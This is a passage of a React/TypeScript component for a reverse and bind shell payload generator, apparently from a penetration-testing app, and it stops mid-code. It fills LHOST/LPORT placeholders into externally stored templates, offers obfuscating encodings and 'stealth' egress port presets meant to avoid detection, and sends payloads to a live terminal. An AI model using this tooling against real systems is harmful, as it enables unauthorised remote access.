import React, { useState, useEffect, useMemo, useCallback } from 'react';
import {
  PayloadTemplate,
  PayloadRenderOptions,
  PayloadRenderResult,
  PayloadFileConfig,
  PayloadOS,
  PayloadEncoding,
} from '../types/payload';
import { CyberIcon } from './CyberIcon';

export interface PayloadGeneratorModalProps {
  onClose: () => void;
  activeSessionId?: string | null;
  activeHostAddress?: string | null;
  onSendToTerminal?: (sessionId: string, text: string) => void;
  // Wails Bindings
  listTemplates: () => Promise<PayloadTemplate[]>;
  saveTemplate: (tmpl: PayloadTemplate) => Promise<void>;
  deleteTemplate: (id: string) => Promise<void>;
  renderPayload: (opts: PayloadRenderOptions) => Promise<PayloadRenderResult>;
  saveAsSnippet: (opts: PayloadRenderOptions, name: string) => Promise<void>;
  getFileConfig: () => Promise<PayloadFileConfig>;
  setFilePath: (path: string) => Promise<PayloadFileConfig>;
  onSelectFile?: (title: string, filterName: string, filterPattern: string) => Promise<string>;
  onSelectDirectory?: (title: string) => Promise<string>;
}

export const PayloadGeneratorModal: React.FC<PayloadGeneratorModalProps> = ({
  onClose,
  activeSessionId,
  activeHostAddress,
  onSendToTerminal,
  listTemplates,
  saveTemplate,
  deleteTemplate,
  renderPayload,
  saveAsSnippet,
  getFileConfig,
  setFilePath,
  onSelectFile,
  onSelectDirectory,
}) => {
  const [templates, setTemplates] = useState<PayloadTemplate[]>([]);
  const [fileConfig, setFileConfig] = useState<PayloadFileConfig | null>(null);
  const [loading, setLoading] = useState<boolean>(true);
  const [error, setError] = useState<string>('');
  const [infoMessage, setInfoMessage] = useState<string>('');

  // Selected template & parameters
  const [selectedTemplateId, setSelectedTemplateId] = useState<string>('');
  const [lhost, setLhost] = useState<string>(activeHostAddress || '10.10.14.1');
  const [lport, setLport] = useState<number>(443);
  const [encoding, setEncoding] = useState<PayloadEncoding>('none');
  const [customVars, setCustomVars] = useState<Record<string, string>>({});

  // Filter states
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [osFilter, setOsFilter] = useState<'all' | PayloadOS>('all');
  const [shellFilter, setShellFilter] = useState<string>('all');
  const [kindFilter, setKindFilter] = useState<string>('all');

  // Render result
  const [renderResult, setRenderResult] = useState<PayloadRenderResult | null>(null);
  const [rendering, setRendering] = useState<boolean>(false);
  const [copyFeedback, setCopyFeedback] = useState<boolean>(false);
  const [savingSnippet, setSavingSnippet] = useState<boolean>(false);

  // Template editor modal
  const [editingTemplate, setEditingTemplate] = useState<PayloadTemplate | null>(null);
  const [savingTemplate, setSavingTemplate] = useState<boolean>(false);

  // File path configuration dialog
  const [showPathInput, setShowPathInput] = useState<boolean>(false);
  const [customPathValue, setCustomPathValue] = useState<string>('');

  // Load initial templates and file config
  const refreshAll = useCallback(async () => {
    setLoading(true);
    setError('');
    try {
      const [cfg, list] = await Promise.all([getFileConfig(), listTemplates()]);
      setFileConfig(cfg);
      setTemplates(list || []);
      if (list && list.length > 0 && !selectedTemplateId) {
        setSelectedTemplateId(list[0].id);
        if (list[0].defaultPort) {
          setLport(list[0].defaultPort);
        }
      }
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    } finally {
      setLoading(false);
    }
  }, [getFileConfig, listTemplates, selectedTemplateId]);

  useEffect(() => {
    void refreshAll();
  }, [refreshAll]);

  // Selected template object
  const currentTemplate = useMemo(() => {
    return templates.find((t) => t.id === selectedTemplateId) || null;
  }, [templates, selectedTemplateId]);

  // When selected template changes, update default port if applicable
  const handleSelectTemplate = (tmpl: PayloadTemplate) => {
    setSelectedTemplateId(tmpl.id);
    if (tmpl.defaultPort && tmpl.defaultPort > 0) {
      setLport(tmpl.defaultPort);
    }
  };

  // Dynamically detect any variable placeholders from the command: {{VAR}}
  const detectedVariables = useMemo(() => {
    if (!currentTemplate) return [];
    const set = new Set<string>();
    if (currentTemplate.variables) {
      currentTemplate.variables.forEach((v: unknown) => {
        if (typeof v === 'string') {
          set.add((v as string).toUpperCase());
        } else if (v && typeof v === 'object' && 'name' in v && typeof (v as { name: unknown }).name === 'string') {
          set.add((v as { name: string }).name.toUpperCase());
        }
      });
    }
    const re = /\{\{([A-Za-z0-9_]+)\}\}/g;
    let match;
    while ((match = re.exec(currentTemplate.command || '')) !== null) {
      set.add(match[1].toUpperCase());
    }
    return Array.from(set);
  }, [currentTemplate]);

  const handleBrowseFile = async () => {
    try {
      const file = onSelectFile
        ? await onSelectFile('Select Payload Templates JSON File', 'JSON Files', '*.json')
        : await (window as unknown as { go?: { main?: { App?: { SelectFileDialog: (t: string, fn: string, fp: string) => Promise<string> } } } }).go?.main?.App?.SelectFileDialog?.(
            'Select Payload Templates JSON File',
            'JSON Files',
            '*.json'
          );
      if (file && file.trim()) {
        const updated = await setFilePath(file.trim());
        setFileConfig(updated);
        await refreshAll();
        setInfoMessage(`Loaded template file: ${file.trim()}`);
      }
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    }
  };

  const handleBrowseFolder = async () => {
    try {
      const folder = onSelectDirectory
        ? await onSelectDirectory('Select Payload Templates Folder')
        : await (window as unknown as { go?: { main?: { App?: { SelectDirectoryDialog: (t: string) => Promise<string> } } } }).go?.main?.App?.SelectDirectoryDialog?.(
            'Select Payload Templates Folder'
          );
      if (folder && folder.trim()) {
        const updated = await setFilePath(folder.trim());
        setFileConfig(updated);
        await refreshAll();
        setInfoMessage(`Configured templates folder: ${folder.trim()} (using default payload_templates.json)`);
      }
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    }
  };

  // Render active payload whenever parameters change
  useEffect(() => {
    if (!currentTemplate) {
      setRenderResult(null);
      return;
    }

    if (!currentTemplate.command || currentTemplate.command.trim() === '') {
      setRenderResult(null);
      return;
    }

    let isMounted = true;
    setRendering(true);

    const opts: PayloadRenderOptions = {
      templateId: currentTemplate.id,
      lhost,
      lport: Number(lport) || 443,
      encoding,
      customVars,
    };

    renderPayload(opts)
      .then((res) => {
        if (isMounted) {
          setRenderResult(res);
          setError('');
        }
      })
      .catch((err: unknown) => {
        if (isMounted) {
          setError(err instanceof Error ? err.message : String(err));
          setRenderResult(null);
        }
      })
      .finally(() => {
        if (isMounted) {
          setRendering(false);
        }
      });

    return () => {
      isMounted = false;
    };
  }, [currentTemplate, lhost, lport, encoding, customVars, renderPayload]);

  // Filter templates list
  const filteredTemplates = useMemo(() => {
    return templates.filter((t) => {
      if (osFilter !== 'all' && t.os !== osFilter && t.os !== 'any') {
        return false;
      }
      if (shellFilter !== 'all' && t.shell !== shellFilter) {
        return false;
      }
      if (kindFilter !== 'all' && t.kind !== kindFilter) {
        return false;
      }
      if (searchQuery.trim() !== '') {
        const q = searchQuery.toLowerCase();
        const matchesName = t.name.toLowerCase().includes(q);
        const matchesDesc = (t.description || '').toLowerCase().includes(q);
        const matchesShell = t.shell.toLowerCase().includes(q);
        const matchesTags = (t.tags || []).some((tag) => tag.toLowerCase().includes(q));
        if (!matchesName && !matchesDesc && !matchesShell && !matchesTags) {
          return false;
        }
      }
      return true;
    });
  }, [templates, osFilter, shellFilter, kindFilter, searchQuery]);

  // Copy to clipboard
  const handleCopy = async () => {
    if (!renderResult || !renderResult.rendered) return;
    try {
      await navigator.clipboard.writeText(renderResult.rendered);
      setCopyFeedback(true);
      setTimeout(() => setCopyFeedback(false), 2000);
    } catch {
      setError('Failed to copy to clipboard.');
    }
  };

  // Save as snippet
  const handleSaveSnippet = async () => {
    if (!currentTemplate || !renderResult) return;
    setSavingSnippet(true);
    setError('');
    try {
      const opts: PayloadRenderOptions = {
        templateId: currentTemplate.id,
        lhost,
        lport: Number(lport) || 443,
        encoding,
        customVars,
      };
      await saveAsSnippet(opts, `Payload: ${currentTemplate.name}`);
      setInfoMessage(`Payload saved to Vault as snippet successfully.`);
      setTimeout(() => setInfoMessage(''), 3000);
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    } finally {
      setSavingSnippet(false);
    }
  };

  // Send to active terminal
  const handleSendTerminal = () => {
    if (!renderResult || !activeSessionId || !onSendToTerminal) return;
    onSendToTerminal(activeSessionId, renderResult.rendered + '\n');
    setInfoMessage('Payload sent to active terminal session.');
    setTimeout(() => setInfoMessage(''), 2500);
  };

  // Save template edit
  const handleSaveTemplateForm = async () => {
    if (!editingTemplate) return;
    if (!editingTemplate.name.trim()) {
      setError('Template name cannot be empty.');
      return;
    }
    if (!editingTemplate.command.trim()) {
      setError('Template command cannot be empty. Populate with {{LHOST}} and {{LPORT}} placeholders.');
      return;
    }

    setSavingTemplate(true);
    setError('');
    try {
      await saveTemplate(editingTemplate);
      setEditingTemplate(null);
      await refreshAll();
      setSelectedTemplateId(editingTemplate.id);
      setInfoMessage('Template saved to external templates file.');
      setTimeout(() => setInfoMessage(''), 3000);
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    } finally {
      setSavingTemplate(false);
    }
  };

  // Delete template
  const handleDeleteTemplate = async (tmpl: PayloadTemplate) => {
    if (!window.confirm(`Delete template "${tmpl.name}" from external templates file?`)) {
      return;
    }
    setError('');
    try {
      await deleteTemplate(tmpl.id);
      await refreshAll();
      setInfoMessage(`Deleted template "${tmpl.name}".`);
      setTimeout(() => setInfoMessage(''), 3000);
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    }
  };

  // Apply new custom file path
  const handleApplyCustomPath = async () => {
    if (!customPathValue.trim()) return;
    setError('');
    try {
      const cfg = await setFilePath(customPathValue.trim());
      setFileConfig(cfg);
      setShowPathInput(false);
      await refreshAll();
      setInfoMessage('Template file path updated successfully.');
      setTimeout(() => setInfoMessage(''), 3000);
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    }
  };

  return (
    <div
      className="cyber-modal-backdrop"
      style={{
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(2, 6, 12, 0.88)',
        backdropFilter: 'blur(5px)',
        zIndex: 1100,
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '1.25rem',
      }}
      onClick={(e) => {
        if (e.target === e.currentTarget && !editingTemplate) onClose();
      }}
    >
      <div
        className="cyber-modal-container"
        style={{
          width: '98%',
          maxWidth: '1160px',
          maxHeight: '92vh',
          backgroundColor: '#050c18',
          border: '1px solid var(--color-primary-cyan, #00f0ff)',
          boxShadow: '0 0 25px rgba(0, 240, 255, 0.25)',
          borderRadius: '4px',
          display: 'flex',
          flexDirection: 'column',
          overflow: 'hidden',
          color: '#e2e8f0',
          fontFamily: 'var(--font-mono, "JetBrains Mono", Consolas, monospace)',
        }}
      >
        {/* Modal Header */}
        <div
          className="cyber-modal-header"
          style={{
            padding: '0.85rem 1.25rem',
            borderBottom: '1px solid rgba(0, 240, 255, 0.25)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            backgroundColor: 'rgba(5, 12, 24, 0.95)',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.65rem' }}>
            <span style={{ color: 'var(--color-primary-cyan, #00f0ff)' }}>
              <CyberIcon name="target" size={20} />
            </span>
            <div>
              <div
                style={{
                  fontSize: '0.95rem',
                  fontWeight: 700,
                  letterSpacing: '0.08em',
                  color: 'var(--color-primary-cyan, #00f0ff)',
                }}
              >
                PAYLOAD GENERATOR // REVERSE & BIND SHELLS (F-33)
              </div>
              <div style={{ fontSize: '0.72rem', color: '#94a3b8' }}>
                Dynamic external templates with LHOST/LPORT replacement, stealth port guidance, encodings & snippet export
              </div>
            </div>
          </div>
          <button
            type="button"
            className="cyber-hud-btn btn-sm"
            onClick={onClose}
            aria-label="Close Payload Generator"
          >
            <CyberIcon name="close" size={14} />
          </button>
        </div>

        {/* External File Banner & OPSEC Guidance */}
        <div
          style={{
            padding: '0.55rem 1.25rem',
            backgroundColor: 'rgba(8, 20, 38, 0.85)',
            borderBottom: '1px solid rgba(0, 240, 255, 0.15)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            flexWrap: 'wrap',
            gap: '0.6rem',
            fontSize: '0.74rem',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', flexWrap: 'wrap' }}>
            <span style={{ color: '#94a3b8' }}>EXTERNAL TEMPLATE STORE:</span>
            <code
              style={{
                color: 'var(--color-primary-cyan, #00f0ff)',
                backgroundColor: 'rgba(0, 240, 255, 0.08)',
                padding: '0.15rem 0.45rem',
                borderRadius: '3px',
                border: '1px solid rgba(0, 240, 255, 0.2)',
              }}
              title={fileConfig?.filePath}
            >
              {fileConfig?.filePath ? fileConfig.filePath.split(/[\\/]/).slice(-2).join('/') : 'loading...'}
            </code>
            <span
              style={{
                backgroundColor: 'rgba(16, 185, 129, 0.15)',
                color: '#34d399',
                border: '1px solid rgba(16, 185, 129, 0.3)',
                padding: '0.1rem 0.4rem',
                borderRadius: '3px',
                fontWeight: 600,
              }}
            >
              {fileConfig ? `${fileConfig.templateCount} TEMPLATES` : '0 TEMPLATES'}
            </span>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: '0.45rem', flexWrap: 'wrap' }}>
            <button
              type="button"
              className="cyber-hud-btn btn-sm"
              onClick={() => void refreshAll()}
              title="Reload templates from disk"
              style={{ padding: '0.2rem 0.55rem', fontSize: '0.72rem' }}
            >
              <CyberIcon name="radar" size={11} />
              <span style={{ marginLeft: '0.35rem' }}>Reload File</span>
            </button>
            <button
              type="button"
              className="cyber-hud-btn btn-sm"
              onClick={() => void handleBrowseFile()}
              title="Select a specific payload templates JSON file"
              style={{ padding: '0.2rem 0.55rem', fontSize: '0.72rem' }}
            >
              <CyberIcon name="folder" size={11} />
              <span style={{ marginLeft: '0.35rem' }}>Browse File</span>
            </button>
            <button
              type="button"
              className="cyber-hud-btn btn-sm"
              onClick={() => void handleBrowseFolder()}
              title="Select a folder (uses default payload_templates.json inside)"
              style={{ padding: '0.2rem 0.55rem', fontSize: '0.72rem' }}
            >
              <CyberIcon name="folder" size={11} />
              <span style={{ marginLeft: '0.35rem' }}>Browse Folder</span>
            </button>
            <button
              type="button"
              className="cyber-hud-btn btn-sm"
              onClick={() => {
                setCustomPathValue(fileConfig?.filePath || '');
                setShowPathInput(!showPathInput);
              }}
              title="Change templates file path"
              style={{ padding: '0.2rem 0.55rem', fontSize: '0.72rem' }}
            >
              <CyberIcon name="edit" size={11} />
              <span style={{ marginLeft: '0.35rem' }}>Config Path</span>
            </button>
          </div>
        </div>

        {/* Custom Path Edit Expandable */}
        {showPathInput && (
          <div
            style={{
              padding: '0.75rem 1.25rem',
              backgroundColor: 'rgba(15, 23, 42, 0.95)',
              borderBottom: '1px solid rgba(0, 240, 255, 0.25)',
              display: 'flex',
              alignItems: 'center',
              gap: '0.65rem',
              flexWrap: 'wrap',
            }}
          >
            <span style={{ fontSize: '0.75rem', color: '#cbd5e1', whiteSpace: 'nowrap' }}>
              File or Folder Path:
            </span>
            <input
              type="text"
              className="cyber-hud-input"
              value={customPathValue}
              onChange={(e) => setCustomPathValue(e.target.value)}
              placeholder="e.g. data/payload_templates.json or folder path"
              style={{ flex: 1, minWidth: '220px', fontSize: '0.78rem' }}
            />
            <button
              type="button"
              className="cyber-hud-btn btn-sm"
              onClick={() => void handleBrowseFile()}
              title="Pick file from disk"
            >
              Pick File
            </button>
            <button
              type="button"
              className="cyber-hud-btn btn-sm"
              onClick={() => void handleBrowseFolder()}
              title="Pick folder from disk"
            >
              Pick Folder
            </button>
            <button
              type="button"
              className="cyber-hud-btn btn-sm btn-primary"
              onClick={() => void handleApplyCustomPath()}
            >
              Apply Path
            </button>
            <button
              type="button"
              className="cyber-hud-btn btn-sm"
              onClick={() => setShowPathInput(false)}
            >
              Cancel
            </button>
          </div>
        )}

        {/* Notifications & Error messages */}
        {error && (
          <div
            style={{
              margin: '0.65rem 1.25rem 0 1.25rem',
              padding: '0.55rem 0.85rem',
              backgroundColor: 'rgba(239, 68, 68, 0.15)',
              border: '1px solid #ef4444',
              color: '#fca5a5',
              borderRadius: '4px',
              fontSize: '0.78rem',
            }}
          >
            {error}
          </div>
        )}
        {infoMessage && (
          <div
            style={{
              margin: '0.65rem 1.25rem 0 1.25rem',
              padding: '0.55rem 0.85rem',
              backgroundColor: 'rgba(16, 185, 129, 0.15)',
              border: '1px solid #10b981',
              color: '#6ee7b7',
              borderRadius: '4px',
              fontSize: '0.78rem',
            }}
          >
            {infoMessage}
          </div>
        )}

        {/* Top Control Bar: LHOST, LPORT, Encoding */}
        <div
          style={{
            padding: '0.85rem 1.25rem',
            borderBottom: '1px solid rgba(0, 240, 255, 0.2)',
            display: 'grid',
            gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))',
            gap: '1rem',
            alignItems: 'end',
            backgroundColor: 'rgba(3, 8, 16, 0.7)',
          }}
        >
          {/* LHOST Field */}
          <div>
            <div
              style={{
                fontSize: '0.72rem',
                color: 'var(--color-primary-cyan, #00f0ff)',
                fontWeight: 600,
                letterSpacing: '0.05em',
                marginBottom: '0.35rem',
                display: 'flex',
                justifyContent: 'space-between',
              }}
            >
              <span>LHOST / LISTENER IP</span>
              <span style={{ color: '#94a3b8', fontSize: '0.68rem' }}>&#123;&#123;LHOST&#125;&#125;</span>
            </div>
            <div style={{ display: 'flex', gap: '0.35rem' }}>
              <input
                type="text"
                className="cyber-hud-input"
                value={lhost}
                onChange={(e) => setLhost(e.target.value)}
                placeholder="e.g. 10.10.14.1"
                style={{ flex: 1, fontSize: '0.82rem' }}
              />
              {activeHostAddress && (
                <button
                  type="button"
                  className="cyber-hud-btn btn-sm"
                  onClick={() => setLhost(activeHostAddress)}
                  title={`Use active host IP (${activeHostAddress})`}
                  style={{ fontSize: '0.7rem', whiteSpace: 'nowrap', padding: '0.2rem 0.5rem' }}
                >
                  Active Host
                </button>
              )}
            </div>
          </div>

          {/* LPORT Field & Stealth Presets */}
          <div>
            <div
              style={{
                fontSize: '0.72rem',
                color: 'var(--color-primary-cyan, #00f0ff)',
                fontWeight: 600,
                letterSpacing: '0.05em',
                marginBottom: '0.35rem',
                display: 'flex',
                justifyContent: 'space-between',
              }}
            >
              <span>LPORT / LISTENER PORT</span>
              <span style={{ color: '#94a3b8', fontSize: '0.68rem' }}>&#123;&#123;LPORT&#125;&#125;</span>
            </div>
            <div style={{ display: 'flex', gap: '0.35rem' }}>
              <input
                type="number"
                min="1"
                max="65535"
                className="cyber-hud-input"
                value={lport}
                onChange={(e) => setLport(parseInt(e.target.value, 10) || 443)}
                style={{ width: '90px', fontSize: '0.82rem' }}
              />
              {/* Quick stealth presets */}
              <div style={{ display: 'flex', gap: '0.25rem', flexWrap: 'wrap' }}>
                <button
                  type="button"
                  className={`cyber-hud-btn btn-sm ${lport === 443 ? 'btn-primary' : ''}`}
                  onClick={() => setLport(443)}
                  title="HTTPS Egress (Recommended Stealth Port)"
                  style={{ padding: '0.2rem 0.45rem', fontSize: '0.7rem' }}
                >
                  443
                </button>
                <button
                  type="button"
                  className={`cyber-hud-btn btn-sm ${lport === 80 ? 'btn-primary' : ''}`}
                  onClick={() => setLport(80)}
                  title="HTTP Egress"
                  style={{ padding: '0.2rem 0.45rem', fontSize: '0.7rem' }}
                >
                  80
                </button>
                <button
                  type="button"
                  className={`cyber-hud-btn btn-sm ${lport === 53 ? 'btn-primary' : ''}`}
                  onClick={() => setLport(53)}
                  title="DNS Egress"
                  style={{ padding: '0.2rem 0.45rem', fontSize: '0.7rem' }}
                >
                  53
                </button>
                <button
                  type="button"
                  className={`cyber-hud-btn btn-sm ${lport === 8443 ? 'btn-primary' : ''}`}
                  onClick={() => setLport(8443)}
                  title="Alt-HTTPS Egress"
                  style={{ padding: '0.2rem 0.45rem', fontSize: '0.7rem' }}
                >
                  8443
                </button>
                <button
                  type="button"
                  className={`cyber-hud-btn btn-sm ${lport === 4444 ? 'btn-danger' : ''}`}
                  onClick={() => setLport(4444)}
                  title="Metasploit default (Signature risk)"
                  style={{ padding: '0.2rem 0.45rem', fontSize: '0.7rem' }}
                >
                  4444
                </button>
              </div>
            </div>
          </div>

          {/* Encoding Option */}
          <div>
            <div
              style={{
                fontSize: '0.72rem',
                color: 'var(--color-primary-cyan, #00f0ff)',
                fontWeight: 600,
                letterSpacing: '0.05em',
                marginBottom: '0.35rem',
              }}
            >
              ENCODING / OBFUSCATION
            </div>
            <select
              className="cyber-hud-select"
              value={encoding}
              onChange={(e) => setEncoding(e.target.value as PayloadEncoding)}
              style={{ width: '100%', fontSize: '0.82rem' }}
            >
              <option value="none">Raw / None</option>
              <option value="powershell_b64">PowerShell (-EncodedCommand UTF-16LE B64)</option>
              <option value="base64">Standard Base64</option>
              <option value="url">URL Encoded (Query Escape)</option>
              <option value="hex">Hexadecimal</option>
            </select>
          </div>
        </div>

        {/* Dynamic General Ports & Custom Variables Row */}
        {detectedVariables.filter((v) => v !== 'LHOST' && v !== 'LPORT').length > 0 && (
          <div
            style={{
              padding: '0.65rem 1.25rem',
              borderBottom: '1px solid rgba(0, 240, 255, 0.2)',
              backgroundColor: 'rgba(5, 15, 30, 0.85)',
              display: 'flex',
              flexWrap: 'wrap',
              gap: '1rem',
              alignItems: 'center',
            }}
          >
            <div style={{ fontSize: '0.72rem', color: '#00f0ff', fontWeight: 700, display: 'flex', alignItems: 'center', gap: '0.35rem' }}>
              <CyberIcon name="terminal" size={12} />
              <span>GENERAL PORTS &amp; PARAMETERS:</span>
            </div>
            {detectedVariables
              .filter((v) => v !== 'LHOST' && v !== 'LPORT')
              .map((varName) => {
                const isPort = varName.includes('PORT');
                const currentVal = customVars[varName] ?? (isPort ? (currentTemplate?.defaultPort ? String(currentTemplate.defaultPort) : '443') : '');
                return (
                  <div key={varName} style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
                    <span style={{ fontSize: '0.72rem', color: '#94a3b8', fontFamily: 'JetBrains Mono, monospace' }}>
                      &#123;&#123;{varName}&#125;&#125;:
                    </span>
                    <input
                      type={isPort ? 'number' : 'text'}
                      min={isPort ? '1' : undefined}
                      max={isPort ? '65535' : undefined}
                      className="cyber-hud-input"
                      value={currentVal}
                      onChange={(e) => {
                        const val = e.target.value;
                        setCustomVars((prev) => ({ ...prev, [varName]: val }));
                      }}
                      placeholder={`value for ${varName}`}
                      style={{ width: isPort ? '90px' : '150px', fontSize: '0.78rem', height: '26px' }}
                    />
                    {isPort && (
                      <div style={{ display: 'flex', gap: '2px' }}>
                        {[443, 80, 53, 8443].map((p) => (
                          <button
                            key={p}
                            type="button"
                            className={`cyber-hud-btn btn-sm ${currentVal === String(p) ? 'btn-primary' : ''}`}
                            onClick={() => setCustomVars((prev) => ({ ...prev, [varName]: String(p) }))}
                            style={{ padding: '0.1rem 0.35rem', fontSize: '0.65rem' }}
                          >
                            {p}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                );
              })}
          </div>
        )}

        {/* Main Content Split: Templates List (Left) & Output / Preview (Right) */}
        <div style={{ flex: 1, display: 'flex', minHeight: 0, overflow: 'hidden' }}>
          {/* Left Column: Template Filter & Selector */}
          <div
            style={{
              width: '380px',
              borderRight: '1px solid rgba(0, 240, 255, 0.2)',
              display: 'flex',
              flexDirection: 'column',
              backgroundColor: 'rgba(3, 8, 16, 0.4)',
            }}
          >
            {/* Filter controls */}
            <div
              style={{
                padding: '0.75rem',
                borderBottom: '1px solid rgba(0, 240, 255, 0.15)',
                display: 'flex',
                flexDirection: 'column',
                gap: '0.5rem',
              }}
            >
              <div style={{ display: 'flex', gap: '0.4rem' }}>
                <input
                  type="text"
                  className="cyber-hud-input"
                  placeholder="Filter templates..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  style={{ flex: 1, fontSize: '0.78rem' }}
                />
                <button
                  type="button"
                  className="cyber-hud-btn btn-sm btn-primary"
                  onClick={() => {
                    setEditingTemplate({
                      id: `tmpl-${Date.now()}`,
                      name: '',
                      description: '',
                      os: 'linux',
                      shell: 'bash',
                      kind: 'reverse',
                      command: '',
                      defaultPort: 443,
                      opsecRisk: 'low',
                      notes: '',
                      tags: [],
                    });
                  }}
                  title="Add new template to external file"
                  style={{ padding: '0.2rem 0.5rem' }}
                >
                  <CyberIcon name="plus" size={12} />
                  <span style={{ marginLeft: '0.3rem', fontSize: '0.72rem' }}>New</span>
                </button>
              </div>

              {/* OS, Shell & Kind Filters */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '0.35rem' }}>
                <select
                  className="cyber-hud-select"
                  value={osFilter}
                  onChange={(e) => setOsFilter(e.target.value as 'all' | PayloadOS)}
                  style={{ fontSize: '0.74rem' }}
                >
                  <option value="all">OS: All</option>
                  <option value="linux">Linux</option>
                  <option value="windows">Windows</option>
                  <option value="macos">macOS</option>
                  <option value="any">Any OS</option>
                </select>

                <select
                  className="cyber-hud-select"
                  value={shellFilter}
                  onChange={(e) => setShellFilter(e.target.value)}
                  style={{ fontSize: '0.74rem' }}
                >
                  <option value="all">Shell: All</option>
                  <option value="bash">Bash</option>
                  <option value="powershell">PowerShell</option>
                  <option value="python">Python</option>
                  <option value="socat">Socat</option>
                  <option value="nc">Netcat</option>
                  <option value="php">PHP</option>
                  <option value="ruby">Ruby</option>
                  <option value="perl">Perl</option>
                </select>

                <select
                  className="cyber-hud-select"
                  value={kindFilter}
                  onChange={(e) => setKindFilter(e.target.value)}
                  style={{ fontSize: '0.74rem' }}
                >
                  <option value="all">Type: All</option>
                  <option value="reverse">Reverse</option>
                  <option value="bind">Bind</option>
                  <option value="one-liner">One-Liner</option>
                  <option value="msfvenom">Msfvenom</option>
                </select>
              </div>
            </div>

            {/* Template Items Scroll List */}
            <div style={{ flex: 1, overflowY: 'auto', padding: '0.5rem' }}>
              {loading ? (
                <div style={{ padding: '2rem 1rem', textAlign: 'center', color: '#94a3b8', fontSize: '0.8rem' }}>
                  Loading templates from external file...
                </div>
              ) : filteredTemplates.length === 0 ? (
                <div style={{ padding: '2rem 1rem', textAlign: 'center', color: '#64748b', fontSize: '0.78rem' }}>
                  No templates matching filters.
                </div>
              ) : (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.45rem' }}>
                  {filteredTemplates.map((t) => {
                    const isSelected = t.id === selectedTemplateId;
                    const hasCommand = t.command && t.command.trim() !== '';

                    return (
                      <div
                        key={t.id}
                        onClick={() => handleSelectTemplate(t)}
                        style={{
                          padding: '0.6rem 0.75rem',
                          backgroundColor: isSelected
                            ? 'rgba(0, 240, 255, 0.12)'
                            : 'rgba(8, 20, 38, 0.65)',
                          border: isSelected
                            ? '1px solid var(--color-primary-cyan, #00f0ff)'
                            : '1px solid rgba(0, 240, 255, 0.15)',
                          borderRadius: '3px',
                          cursor: 'pointer',
                          transition: 'all 0.15s ease',
                        }}
                      >
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                          <span
                            style={{
                              fontSize: '0.82rem',
                              fontWeight: 600,
                              color: isSelected ? 'var(--color-primary-cyan, #00f0ff)' : '#f1f5f9',
                            }}
                          >
                            {t.name}
                          </span>
                          <span
                            style={{
                              fontSize: '0.62rem',
                              padding: '0.1rem 0.35rem',
                              borderRadius: '2px',
                              backgroundColor:
                                t.os === 'windows'
                                  ? 'rgba(59, 130, 246, 0.2)'
                                  : t.os === 'linux'
                                  ? 'rgba(234, 179, 8, 0.2)'
                                  : 'rgba(148, 163, 184, 0.2)',
                              color:
                                t.os === 'windows'
                                  ? '#93c5fd'
                                  : t.os === 'linux'
                                  ? '#fde047'
                                  : '#cbd5e1',
                              textTransform: 'uppercase',
                              fontWeight: 600,
                            }}
                          >
                            {t.os}
                          </span>
                        </div>

                        <div
                          style={{
                            display: 'flex',
                            alignItems: 'center',
                            gap: '0.35rem',
                            marginTop: '0.35rem',
                            flexWrap: 'wrap',
                          }}
                        >
                          <span
                            style={{
                              fontSize: '0.65rem',
                              color: '#94a3b8',
                              backgroundColor: 'rgba(15, 23, 42, 0.8)',
                              padding: '0.05rem 0.3rem',
                              borderRadius: '2px',
                            }}
                          >
                            {t.shell}
                          </span>
                          <span
                            style={{
                              fontSize: '0.65rem',
                              color: '#94a3b8',
                              backgroundColor: 'rgba(15, 23, 42, 0.8)',
                              padding: '0.05rem 0.3rem',
                              borderRadius: '2px',
                            }}
                          >
                            {t.kind}
                          </span>
                          {!hasCommand && (
                            <span
                              style={{
                                fontSize: '0.62rem',
                                color: '#fbbf24',
                                backgroundColor: 'rgba(245, 158, 11, 0.15)',
                                border: '1px solid rgba(245, 158, 11, 0.3)',
                                padding: '0.05rem 0.3rem',
                                borderRadius: '2px',
                              }}
                            >
                              Ready to Populate
                            </span>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>

          {/* Right Column: Template Details, Command Preview & Actions */}
          <div
            style={{
              flex: 1,
              display: 'flex',
              flexDirection: 'column',
              minHeight: 0,
              padding: '1.25rem',
              overflowY: 'auto',
            }}
          >
            {currentTemplate ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem', height: '100%' }}>
                {/* Selected Template Header */}
                <div
                  style={{
                    display: 'flex',
                    alignItems: 'flex-start',
                    justifyContent: 'space-between',
                    flexWrap: 'wrap',
                    gap: '0.75rem',
                    borderBottom: '1px dashed rgba(0, 240, 255, 0.2)',
                    paddingBottom: '0.75rem',
                  }}
                >
                  <div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                      <span style={{ fontSize: '1.05rem', fontWeight: 700, color: '#f8fafc' }}>
                        {currentTemplate.name}
                      </span>
                      <span
                        style={{
                          fontSize: '0.68rem',
                          padding: '0.15rem 0.45rem',
                          borderRadius: '3px',
                          backgroundColor:
                            currentTemplate.opsecRisk === 'high'
                              ? 'rgba(239, 68, 68, 0.2)'
                              : currentTemplate.opsecRisk === 'medium'
